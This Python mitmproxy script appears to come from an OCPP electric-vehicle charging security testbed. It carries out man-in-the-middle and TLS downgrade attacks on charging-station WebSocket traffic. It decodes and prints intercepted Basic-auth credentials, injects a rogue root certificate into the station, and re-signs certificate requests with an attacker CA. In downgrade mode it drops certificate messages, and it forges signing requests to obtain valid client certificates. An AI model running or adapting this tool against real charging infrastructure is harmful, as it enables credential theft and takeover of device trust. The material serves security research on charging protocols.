import base64
from datetime import datetime, timezone, timedelta
import os
import time
from mitmproxy import http, websocket, ctx, tcp, tls
import json
from mitmproxy import ctx

import pickle
from uuid import uuid4

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, ec
from cryptography.x509.oid import NameOID
import mitmproxy


cert_path = './mitm/certificates/root/certificate_mitm.pem'
installed = False
booted = False
boot_id = None
client_cert = None
csCert = False
drop_ids = []
client_cert_path = "./mitm/certificates/none.pem"


def generate_key_pair(serial):
        # Generate a private key using ECDSA (Elliptic Curve Digital Signature Algorithm)
        private_key = ec.generate_private_key(ec.SECP256R1())   

        # Save the private key to a PEM file
        pem_private_key = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        with open(f"./mitm/certificates/{serial}/private_key.pem", "wb") as f:
            f.write(pem_private_key)

        print(f"Key pair generated and saved as 'private_key_{serial}.pem' and 'public_key.pem'")

def load_certificate(cert_path):
    # Read the certificate from the file
    with open(cert_path, 'r') as cert_file:
        cert_data = cert_file.read()
    # Ensure the certificate length is within the allowed bounds
    if len(cert_data) > 5500:
        raise ValueError("Certificate exceeds maximum allowed length (5500 characters).")
    return cert_data

def load(loader):
    # Register the 'type' option with a default value
    ctx.options.add_option(
        "type", str, "mitm", "Type of attack you want to perform"
    )
    
    ctx.log.info(f"Argument type: {ctx.options.type}")
    ctx.log.info("TLS handshake dropper loaded")
    
def print_dict(d, indent = 0, msg = None):
    # Iterate over the dictionary items
    for key, value in d.items():
        if isinstance(value, dict):
            # If the value is a dictionary, call the function recursively
            print(f'{" " * indent}{key}:')
            print_dict(value, indent + 4)  # Increase the indentation for nested dicts
        else:
            # Print the key-value pair
            print(f'{" " * indent}{key}:   {value}')
        if ctx.options.type == "downgrade":
            if key == 'certificateChain' or key == 'cert':
                print("====================================================\n")
                print("====================================================\n")
                print("                  DROPPING MESSAGE                  \n")
                print("====================================================\n")
                print("====================================================\n")
                msg.drop()

def tls_clienthello(data: tls.ClientHelloData):
    # Log the ClientHello details
    print(f"ClientHello received from: {data}")

    # Drop the connection
    #print('Blocking TLS handshake...')
    #os.popen('echo 0 > /proc/sys/net/ipv6/conf/all/forwarding; sleep 30; echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
    #time.sleep(10)
    

# This function is called when an HTTP request is captured
def request(flow: http.HTTPFlow) -> None:
    print("=== HTTP REQUEST ===")
    print(f"Host: {flow.request.host}")
    print(f"Path: {flow.request.path}")
    print(f"Method: {flow.request.method}")
    print(f"Headers: {flow.request.headers}")
    print(f"Content: {flow.request.text}")
    print("====================\n\n")
    for key, value in flow.request.headers.items():
        if key == 'Authorization':
            authorization = value.split("Basic ")[1]
            decoded_credentials = base64.b64decode(authorization).decode('utf-8')
            print("====================================================\n")
            print("====================================================\n")
            print("               CREDENTIALS FOUND                    \n")
            print(f"           {decoded_credentials}                   \n")
            print("====================================================\n")
            print("====================================================\n")

# This function is called when an HTTP response is captured
def response(flow: http.HTTPFlow) -> None:
    print("=== HTTP RESPONSE ===")
    print(f"Status Code: {flow.response.status_code}")
    print(f"Headers: {flow.response.headers}")
    print(f"Content: {flow.response.text}")
    print("====================\n")

# This function is called when a WebSocket connection is established
def websocket_handshake(flow: http.HTTPFlow):
    print(f"=== WEBSOCKET HANDSHAKE ===")
    print(f"Client to {flow.request.host} initiated WebSocket connection")
    print("===========================\n")

def websocket_message(flow: http.HTTPFlow):
    global installed
    global cert_path
    global booted
    global boot_id
    global client_cert
    global csCert
    global drop_ids

    message = flow.websocket.messages[-1] # Get the last message
    direction = "CLIENT -> SERVER" if message.from_client else "SERVER -> CLIENT"
    
    print(f"=== WEBSOCKET MESSAGE ===")
    print(f"{direction}")
    print(f'Injected?   {message.injected}')
    print(f"Message received: {message.content}")
    
    # Assuming the content is a JSON-like string, convert it to a dictionary
    try:
        content_dict = json.loads(message.content)
        if content_dict[1] in drop_ids and content_dict[0]==3:
            message.drop()
            drop_ids.remove(content_dict[1])
        if direction == 'CLIENT -> SERVER':
            if content_dict[2] == 'BootNotification':
                boot_id = content_dict[1]
            if content_dict[2] == 'SignCertificate' and not message.injected:
                
                message.drop()
                csCert = True
                os.makedirs(f'./mitm/certificates/{flow.request.path_components[0]}', exist_ok=True)

                resp = [3, content_dict[1], {'status': 'Accepted'}]
                ctx.master.commands.call("inject.websocket", flow, True, json.dumps(resp).encode('utf-8'))

                csr = content_dict[3]['csr']
                csr_data = x509.load_pem_x509_csr(csr.encode(), default_backend())
                with open('./mitm/certificates/root/private_key_mitm.pem', 'rb') as f:
                    ca_private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

                with open('./mitm/certificates/root/certificate_mitm.pem', 'rb') as f:
                    ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())

                cert = (
                    x509.CertificateBuilder()
                    .subject_name(csr_data.subject)
                    .issuer_name(ca_cert.subject)  # Use emuocpp-ttp as the issuer
                    .public_key(csr_data.public_key())  # The public key of the client/server
                    .serial_number(x509.random_serial_number())
                    .not_valid_before(datetime.now(timezone.utc))
                    .not_valid_after(datetime.now(timezone.utc) + timedelta(days=365 * 2))  # Valid for 2 years
                    .add_extension(
                        x509.BasicConstraints(ca=False, path_length=None), critical=True
                    )
                    .sign(ca_private_key, hashes.SHA256(), default_backend())  # Sign using emuocpp-ttp's private key
                )
                client_cert = cert.public_bytes(encoding=serialization.Encoding.PEM).decode()
                print("====================================================\n")
                print("====================================================\n")
                print('        INSTALLING CS CERTIFICATE INTO CLIENT         ')
                print("====================================================\n")
                print("====================================================\n")
                subprotocol = flow.request.headers.get("Sec-WebSocket-Protocol")
                new_content = [2, str(uuid4()), 'CertificateSigned', {
                    'certificateChain': client_cert
                } if subprotocol != 'ocpp2.0' else {'cert': [client_cert]}]
                drop_ids.append(new_content[1])
                ctx.master.commands.call("inject.websocket", flow, True, json.dumps(new_content).encode('utf-8'))
                

        elif direction == 'SERVER -> CLIENT':
            if not installed and booted:
                print("====================================================\n")
                print("====================================================\n")
                print('          INSTALLING CERTIFICATE INTO CLIENT          ')
                print("====================================================\n")
                print("====================================================\n")
                subprotocol = flow.request.headers.get("Sec-WebSocket-Protocol")
                print(f'OCPP VERSION:    {subprotocol}')
                new_content = content_dict[:-1]
                new_content[0] = 2 
                new_content[1] = str(uuid4())
                new_content.append('InstallCertificate')
                new_content.append({
                    'certificateType': 'CSMSRootCertificate' if subprotocol != 'ocpp1.6' else 'CentralSystemRootCertificate',
                    'certificate': load_certificate(cert_path)
                })
                ctx.master.commands.call("inject.websocket", flow, True, json.dumps(new_content).encode('utf-8'))
                installed = True
            if content_dict[1] == boot_id:
                booted = True
            if content_dict[2] == 'CertificateSigned':
                if not message.injected:
                    message.drop()
                    subprotocol = flow.request.headers.get("Sec-WebSocket-Protocol")
                    if subprotocol != 'ocpp2.0':
                        certificate = content_dict[3]['certificateChain']
                    else:
                        certificate = content_dict[3]['cert'][0]
                    with open(f"./mitm/certificates/{flow.request.path_components[0]}/certificate_{flow.request.path_components[0]}.pem", "w") as cert_file:
                        cert_file.write(certificate)
                    print("====================================================\n")
                    print("====================================================\n")
                    print('          CERTIFICATE RECEIVED FROM SERVER            ')
                    print("====================================================\n")
                    print("====================================================\n")
                    os.popen(f'cat ./mitm/certificates/{flow.request.path_components[0]}/certificate_{flow.request.path_components[0]}.pem ./mitm/certificates/{flow.request.path_components[0]}/private_key.pem > ./mitm/certificates/{flow.request.path_components[0]}/combined.pem')
                    time.sleep(1)
                    ctx.options.update(client_certs = f'./mitm/certificates/{flow.request.path_components[0]}/combined.pem')
                    time.sleep(1)
                    acc = [3, content_dict[1], {'status': 'Accepted'}]
                    ctx.master.commands.call("inject.websocket", flow, False, json.dumps(acc).encode('utf-8'))
                
        if csCert:
            generate_key_pair(serial=flow.request.path_components[0])
            try:
                with open(f"./mitm/certificates/{flow.request.path_components[0]}/private_key.pem", "rb") as key_file:
                    private_key = serialization.load_pem_private_key(
                        key_file.read(),
                        password=None,
                        backend=default_backend()
                    )
            except Exception as e:
                print(f'There is a problem with CS public/private key: {e}')
                return
            
            subject = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, u"AN"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Anonymous"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, u"Anonymous"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'EmuOCPP'),
                x509.NameAttribute(NameOID.COMMON_NAME, flow.request.path_components[0]),
            ])

            csr = x509.CertificateSigningRequestBuilder().subject_name(
                subject
            ).sign(private_key, hashes.SHA256())

            csr_pem = csr.public_bytes(serialization.Encoding.PEM)
            send_csr = [2, str(uuid4()), 'SignCertificate', {'csr': csr_pem.decode()}]
            drop_ids.append(send_csr[1])

            ctx.master.commands.call("inject.websocket", flow, False, json.dumps(send_csr).encode('utf-8'))
            csCert = False

        # Get the indexes of dictionaries in content_dict
        indexes = [i for i, element in enumerate(content_dict) if isinstance(element, dict)]

        for index in indexes:
            print(f'Dictionary at index {index}:')
            print_dict(content_dict[index], msg=message)
        # message.text = json.dumps(content_dict)

        # Convert the modified dictionary back to a JSON string
        print(f"Message sent: {message.content}" if not message.dropped else 'Message dropped.')
    except json.JSONDecodeError:
        print("Message content is not a valid JSON")
    
    print("========================\n")

# This function is called when a WebSocket connection is closed
def websocket_end(flow: websocket.WebSocketMessage):
    print(f"=== WEBSOCKET CONNECTION CLOSED ===")
    print(f"Client to {flow.request.host} WebSocket connection closed")
    print("=============================\n")